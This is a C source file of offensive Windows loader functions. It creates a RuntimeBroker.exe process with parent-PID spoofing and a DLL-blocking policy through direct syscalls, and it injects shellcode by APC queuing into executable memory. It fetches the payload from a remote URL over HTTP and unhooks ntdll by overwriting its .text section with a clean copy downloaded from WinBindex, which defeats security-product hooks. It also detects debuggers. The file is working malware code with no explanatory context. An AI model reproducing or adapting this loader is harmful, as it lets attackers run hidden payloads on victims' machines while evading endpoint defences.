#include "Functions.h"

//Replacement of RtlInitUnicodeString
VOID _RtlInitUnicodeString(OUT PUNICODE_STRING PusStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((PusStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		PusStruct->Length = Length;
		PusStruct->MaximumLength = PusStruct->Length + sizeof(WCHAR);
	}

	else PusStruct->Length = PusStruct->MaximumLength = 0;
}

//Uses NtCreateUserProcess to create a RuntimeBorker.exe process using DllPolicyBlock and Ppid Spoofing techniques
BOOL CreateRuntimeBrokerProcess(IN PWSTR szTargetProcess,	IN PWSTR szTargetProcessParameters,	IN PWSTR szTargetProcessPath, IN HANDLE	hParentProcess,	OUT PHANDLE hProcess, OUT PHANDLE hThread) {

	fnRtlCreateProcessParametersEx	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");

	NTSTATUS						STATUS = NULL;

	UNICODE_STRING					UsNtImagePath = { 0 },
									UsCmdLine = { 0 },
									UsCurDir = { 0 };

	PRTL_USER_PROCESS_PARAMETERS	PuppProcessParameters = NULL;

	DWORD64							dwBlockDllPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	PPS_ATTRIBUTE_LIST				pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));

	if (!pAttributeList)
		return FALSE;

	if (RtlCreateProcessParametersEx == NULL)
		return FALSE;

	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCmdLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurDir, szTargetProcessPath);

	STATUS = RtlCreateProcessParametersEx(&PuppProcessParameters, &UsNtImagePath, NULL, &UsCurDir, &UsCmdLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		goto _EndOfFunc;
	}

	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size = UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value = (ULONG_PTR)UsNtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[1].Size = sizeof(DWORD64);
	pAttributeList->Attributes[1].Value = &dwBlockDllPolicy;

	pAttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[2].Size = sizeof(HANDLE);
	pAttributeList->Attributes[2].Value = hParentProcess;

	PS_CREATE_INFO				psCreateInfo = {
											.Size = sizeof(PS_CREATE_INFO),
											.State = PsCreateInitialState
	};

	STATUS = Sw3NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, PuppProcessParameters, &psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		goto _EndOfFunc;
	}

_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}

//Get a handle from a process using NtQuerySystemInformation
BOOL GetProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	ULONG							uReturnLen1 = NULL,
									uReturnLen2 = NULL;

	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;

	PVOID							pTempValue = NULL;

	NTSTATUS						STATUS = NULL;


	Sw3NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	pTempValue = SystemProcInfo;

	STATUS = Sw3NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		return FALSE;
	}

	while (TRUE) {

		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		if (!SystemProcInfo->NextEntryOffset)
			break;
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pTempValue);

	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

//Inject a payload in a process using APC technique and using Nt functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtQueueApcThread) 
BOOL ApcPayloadInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


	NTSTATUS		STATUS = NULL;

	PVOID			pAddress = NULL;

	ULONG			uOldProtection = NULL;

	SIZE_T			sSize = sPayloadSize,
					sNumberOfBytesWritten = NULL;

	if ((STATUS = Sw3NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		return FALSE;
	}

	if ((STATUS = Sw3NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		return FALSE;
	}

	if ((STATUS = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		return FALSE;
	}

	if ((STATUS = Sw3NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		return FALSE;
	}

	return TRUE;
}

//Function using a technique called Staging to get a payload from a http server
BOOL PayloadStagingFromWeb(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
				hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			   

	PBYTE		pBytes = NULL,					
				pTmpBytes = NULL;				

	hInternet = InternetOpenW(L"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/6.0", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);									
	return bSTATE;
}

//Getting Handle and Base Address of Ntdll (Similar to GetModuleHandle)
PVOID GetLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}

//Read Ntdll.dll file from WinBindex
BOOL ReadNtdllFromWinbindex(OUT PVOID* ppNtdllBuf) {

	PBYTE	pNtdllModule = (PBYTE)GetLocalNtdllBaseAddress();

	PVOID	pNtdllBuffer = NULL;

	SIZE_T	sNtdllSize = NULL;

	WCHAR	szFullUrl[MAX_PATH] = { 0 };

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	wsprintfW(szFullUrl, L"%s%0.8X%0.4X/ntdll.dll", NTDLL_URL, pImgNtHdrs->FileHeader.TimeDateStamp, pImgNtHdrs->OptionalHeader.SizeOfImage);
	if (!PayloadStagingFromWeb(szFullUrl, &pNtdllBuffer, &sNtdllSize))
		return FALSE;

	*ppNtdllBuf = pNtdllBuffer;

	return TRUE;
}

//Replace a new unhooked .Text Section in ntdll.dll 
BOOL ReplaceNtdllTextSection(IN PVOID pUnhookedNtdll) {

	PVOID				pLocalNtdll = (PVOID)GetLocalNtdllBaseAddress();

	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;

	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);

	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,
				pRemoteNtdllTxt = NULL;

	SIZE_T		sNtdllTxtSize = NULL;

	DWORD		dwOldProtection = NULL;

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		(ULONG_PTR)pRemoteNtdllTxt += 3072;
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
			return FALSE;
	}

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		return FALSE;
	}

	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		return FALSE;
	}

	return TRUE;
}

//Replacement of IsDebuggerPresent function, but better
BOOL IsDebuggerPresentRpl() {

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	if (pPeb->NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS))
		return TRUE;

	if (pPeb->BeingDebugged == 1)
		return TRUE;

	return FALSE;
}